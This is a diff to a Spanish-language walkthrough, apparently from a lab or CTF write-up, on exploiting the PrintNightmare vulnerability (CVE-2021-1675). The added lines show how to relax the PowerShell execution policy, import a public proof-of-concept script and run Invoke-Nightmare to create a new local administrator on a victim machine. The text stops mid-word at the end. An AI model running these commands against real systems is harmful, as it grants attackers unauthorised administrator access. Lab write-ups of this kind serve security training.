@@ -87,8 +87,19 @@ wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/mai
 
 Lo que hace es crearnos un usuario a nivel de sistema con privilegios de `Administrador`pudiendo conectarnos con esas nuevas credenciales a la maquina con esos permisos creado
 
-Lo subimos a la maquina victima, y lo ejecutamos usando 
+Lo subimos a la maquina victima, y lo ejecutamos, en caso de error deberemos de verificar nuestra politica de ejcucion usando `Get-ExecutionPolicy` en caso de devilvernos un `Restricted` deberemos ejecutar `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser` para que nuestro usuario pueda ejecutar scripts.
 
+A continuación importaremos el modulo
+```shell
+Import-Module .\CVE-2021-1675.ps1
+```
+
+Y despues lo ejecutamos
+```shell
+Invoke-Nightmare -DriverName "Xerox" -NewUser "jaime" -NewPassword "123456"
+```
+
+Habiendose
 
 
 
